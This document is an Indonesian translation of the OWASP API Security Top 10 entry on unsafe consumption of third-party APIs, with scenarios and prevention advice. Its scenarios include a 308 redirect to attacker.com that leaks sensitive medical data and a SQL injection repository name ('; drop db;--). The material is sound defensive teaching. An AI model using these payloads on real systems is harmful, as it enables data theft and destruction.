# API10:2023 Konsumsi API yang Tidak Aman

| Agen Ancaman/Vektor Serangan | Kelemahan Keamanan | Dampak |
| - | - | - |
| Khusus API : Kemungkinan Dieksploitasi **Mudah** | Prevalensi **Umum** : Kemungkinan Dideteksi **Sedang** | Teknis **Serius** : Khusus Bisnis |
| Penyerang perlu mengidentifikasi dan mungkin mengkompromikan API/Layanan lain yang terintegrasi dengan API target untuk mengeksploitasi masalah ini. Biasanya, informasi ini tidak tersedia secara publik atau API/layanan yang terintegrasi tidak mudah dieksploitasi. | Para pengembang cenderung percaya dan tidak memverifikasi endpoint yang berinteraksi dengan API eksternal atau pihak ketiga, mengandalkan persyaratan keamanan yang lebih lemah seperti yang berkaitan dengan keamanan transportasi, otentikasi/otorisasi, dan validasi serta sanitasi input. Penyerang perlu mengidentifikasi layanan yang terintegrasi dengan API target (sumber data) dan, akhirnya, mengkompromikannya. | Dampaknya bervariasi sesuai dengan apa yang dilakukan API target dengan data yang diambil. Eksploitasi yang berhasil dapat menyebabkan paparan informasi sensitif kepada aktor yang tidak diotorisasi, banyak jenis injeksi, atau penolakan layanan. |

## Apakah API Rentan?

Pengembang cenderung lebih percaya data yang diterima dari API pihak ketiga daripada masukan pengguna. Hal ini terutama berlaku untuk API yang ditawarkan oleh perusahaan-perusahaan terkemuka. Karena itu, pengembang cenderung mengadopsi standar keamanan yang lebih lemah, misalnya dalam hal validasi dan sanitasi input.

API mungkin rentan jika:

* Berinteraksi dengan API lain melalui saluran yang tidak terenkripsi;
* Tidak memvalidasi dan menyaring data yang dikumpulkan dari API lain sebelum
  memprosesnya atau melewatkan data tersebut ke komponen yang lebih rendah;
* Mengikuti pengalihan tanpa pertimbangan;
* Tidak membatasi jumlah sumber daya yang tersedia untuk memproses respons layanan pihak ketiga;
* Tidak mengimplementasikan batas waktu untuk interaksi dengan layanan pihak ketiga;

## Contoh Skenario Serangan

### Skenario #1

Sebuah API mengandalkan layanan pihak ketiga untuk memperkaya alamat bisnis yang diberikan oleh pengguna akhir. Ketika alamat diberikan kepada API oleh pengguna akhir, alamat tersebut dikirim ke layanan pihak ketiga dan data yang dikembalikan kemudian disimpan dalam database lokal yang mendukung SQL.

Aktor jahat menggunakan layanan pihak ketiga untuk menyimpan muatan SQLi yang terkait dengan bisnis yang dibuat oleh mereka. Kemudian mereka menyerang API yang rentan dengan memberikan masukan khusus yang membuatnya menarik "bisnis berbahaya" mereka dari layanan pihak ketiga. Muatan SQLi akhirnya dieksekusi oleh database, mengirimkan data ke server yang dikendalikan oleh penyerang.

### Skenario #2

Sebuah API terintegrasi dengan penyedia layanan pihak ketiga untuk menyimpan secara aman informasi medis sensitif pengguna. Data dikirim melalui koneksi aman menggunakan permintaan HTTP seperti di bawah ini:

```
POST /user/store_phr_record
{
  "genome": "ACTAGTAG__TTGADDAAIICCTT…"
}
```

Aktor jahat menemukan cara untuk mengkompromikan API pihak ketiga dan mulai memberikan respons `308 Permanent Redirect` untuk permintaan seperti di atas.

```
HTTP/1.1 308 Permanent Redirect
Location: https://attacker.com/
```

Karena API mengikuti pengalihan dari layanan pihak ketiga tanpa mempertimbangkannya, ia akan mengirimkan permintaan yang sama persis termasuk data sensitif pengguna, namun kali ini ke server penyerang.

### Skenario #3

Seorang penyerang dapat menyiapkan repositori git yang diberi nama `'; drop db;--`.

Sekarang, ketika integrasi dari aplikasi yang diserang dilakukan dengan repositori jahat ini, muatan injeksi SQL digunakan pada aplikasi yang membangun kueri SQL yang percaya bahwa nama repositori adalah masukan yang aman.

## Cara Mencegah

* Saat mengevaluasi penyedia layanan, nilai postur keamanan API mereka.
* Pastikan semua interaksi API terjadi melalui saluran komunikasi yang aman (TLS).
* Selalu validasi dan lakukan sanitasi data yang diterima dari API terintegrasi sebelum menggunakannya.
* Pelihara daftar whitelist lokasi yang dikenal API terintegrasi yang dapat mengalihkan
  permintaan Anda: jangan mengikuti pengalihan tanpa pertimbangan.


## Referensi

### OWASP

* [Cheat Sheet Keamanan Layanan Web][1]
* [Kekurangan Injeksi][2]
* [Cheat Sheet Validasi Input][3]
* [Cheat Sheet Pencegahan Injeksi][4]
* [Cheat Sheet Perlindungan Lapisan Transport][5]
* [Cheat Sheet Pengalihan dan Pengalihan Tanpa Validasi][6]

### Eksternal

* [CWE-20: Validasi Input yang Tidak Tepat][7]
* [CWE-200: Paparan Informasi Sensitif kepada Aktor yang Tidak Diotorisasi][8]
* [CWE-319: Pengiriman Teks Terbuka Informasi Sensitif][9]

[1]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html
[2]: https://www.owasp.org/index.php/Injection_Flaws
[3]: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
[4]: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
[5]: https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html
[6]: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
[7]: https://cwe.mitre.org/data/definitions/20.html
[8]: https://cwe.mitre.org/data/definitions/200.html
[9]: https://cwe.mitre.org/data/definitions/319.html